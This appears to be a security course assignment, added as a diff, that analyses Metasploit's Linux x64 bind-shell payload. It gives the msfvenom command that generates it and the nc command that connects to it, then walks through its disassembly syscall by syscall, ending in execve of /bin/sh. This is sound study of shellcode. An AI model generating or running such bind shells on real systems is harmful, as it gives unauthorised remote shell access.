@@ -1,0 +1,164 @@
+Assignment#5
+
+Author : SLAE64-PA-6470 (kahlon81)
+
+Analysis of linux/x64/shell_bind_tcp
+
+>>> Generate shellcode
+
+msfvenom -a x64 --platform linux -p linux/x64/shell_bind_tcp -f elf > shell_bind_tcp
+No encoder or badchars specified, outputting raw payload
+Payload size: 86 bytes
+Final size of elf file: 206 bytes
+
+Usage :
+
+Target :
+chmod +x shell_bind_tcp 
+./shell_bind_tcp 
+
+Pentester :
+nc <Target IP> 4444
+
+>>> Search entry point address
+
+readelf -a ./shell_bind_tcp 
+ELF Header:
+  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
+  Class:                             ELF64
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           Advanced Micro Devices X86-64
+  Version:                           0x1
+  Entry point address:               0x400078
+  Start of program headers:          64 (bytes into file)
+  Start of section headers:          0 (bytes into file)
+  Flags:                             0x0
+  Size of this header:               64 (bytes)
+  Size of program headers:           56 (bytes)
+  Number of program headers:         1
+  Size of section headers:           0 (bytes)
+  Number of section headers:         0
+  Section header string table index: 0
+
+>>> Debug with gdb
+
+gdb ./shell_bind_tcp
+break *0x400078
+set disassembly-flavor intel
+run
+layout asm
+layout regs
+
+Analysis :
+
+1) Open a socket stream
+
+B+>│0x400078        push   0x29                                                                                                     
+   │0x40007a        pop    rax                                                                                                      
+   │0x40007b        cdq                                                                                                             
+   │0x40007c        push   0x2                                                                                                      
+   │0x40007e        pop    rdi                                                                                                      
+   │0x40007f        push   0x1                                                                                                      
+   │0x400081        pop    rsi                                                                                                      
+   │0x400082        syscall   
+
+
+sys_socket (rax = 0x29) int family (rdi = 0x02)  int type (rsi = 0x01)  int protocol (rdx = 0x00)
+
+
+2) Bind TCP socket on port 4444
+
+  >│0x400084        xchg   rdi,rax                                                                                                  
+   │0x400086        push   rdx                                                                                                      
+   │0x400087        mov    DWORD PTR [rsp],0x5c110002                                                                            
+   │0x40008e        mov    rsi,rsp                                                                                                  
+   │0x400091        push   0x10                                                                                                     
+   │0x400093        pop    rdx                                                                                                      
+   │0x400094        push   0x31                                                                                                     
+   │0x400096        pop    rax                                                                                                      
+   │0x400097        syscall  
+
+
+sys_bind (rax = 49)  int fd (rdi)  struct sokaddr *umyaddr (rsi) int addrlen (rdx = 0x10)
+
+where rsi points to stack with C structure :
+
+struct sockaddr_in {
+   uint8_t         sin_len;       /* total length      */
+   sa_family_t     sin_family;    /* family : AF_INET  */
+   in_port_t       sin_port;      /* port number       */
+   struct in_addr  sin_addr;      /* inet address      */
+   unsigned char   sin_zero[8];   /* 8 zeros           */
+};
+
+    
+sin_addr = 0 (push rdx) = INADDR_ANY = any address for binding
+
+  >│0x400084        xchg   rdi,rax                                                                                                  
+   │0x400086        push   rdx 
+
+sin_port = 4444 (0x5c11 is little endian version of 0x115c = 4444)
+    mov    DWORD PTR [rsp],0x5c110002 
+
+sin_family = 2 = AF_INET 
+    mov    DWORD PTR [rsp],0x5c110002 
+
+sin_len = 0x10
+    push   0x10                                                                                                     
+    pop    rdx 
+
+
+3) Socket listen
+
+   │0x400099        push   0x32                                                                                                     
+   │0x40009b        pop    rax                                                                                                      
+   │0x40009c        syscall 
+
+syscall sys_listen (rax = 50)  int fd  int backlog
+
+4) Accept connection
+
+   │0x40009e        xor    rsi,rsi                                                                                                  
+   │0x4000a1        push   0x2b                                                                                                     
+   │0x4000a3        pop    rax                                                                                                      
+   │0x4000a4        syscall  
+
+sys_accept (rax = 43) int fd  struct sockaddr *upeer_sockaddr int *upeer_addrlen
+
+5) Duplicate socket (stdin, stout, stderr)
+    
+  >│0x4000a6        xchg   rdi,rax 
+   │0x4000a8        push   0x3                                                                                                      
+   │0x4000aa        pop    rsi                                                                                                      
+   │0x4000ab        dec    rsi                                                                                                      
+   │0x4000ae        push   0x21                                                                                                     
+   │0x4000b0        pop    rax                                                                                                      
+   │0x4000b1        syscall 
+
+sys_dup2 (rax = 33) unsigned int oldfd  unsigned int newfd  
+
+6) Shellcode
+
+Call to sys_execve (rax = 59) const char *filename  const char *const argv[]  const char *
+
+Execute /bin/sh which is hs/nib/ in little endian or 0x68732f6e69622f in hexa
+
+    0x4000b3        jne    0x4000ab                                                                                                 
+   │0x4000b5        push   0x3b                                                                                                     
+   │0x4000b7        pop    rax                                                                                                      
+   │0x4000b8        cdq                                                                                                             
+   │0x4000b9        movabs rbx,0x68732f6e69622f                                                                                     
+   │0x4000c3        push   rbx                                                                                                      
+   │0x4000c4        mov    rdi,rsp                                                                                                 
+   │0x4000c7        push   rdx                                                                                                      
+   │0x4000c8        push   rdi                                                                                                      
+   │0x4000c9        mov    rsi,rsp                                                                                                  
+   │0x4000cc        syscall     
+
+
+
+
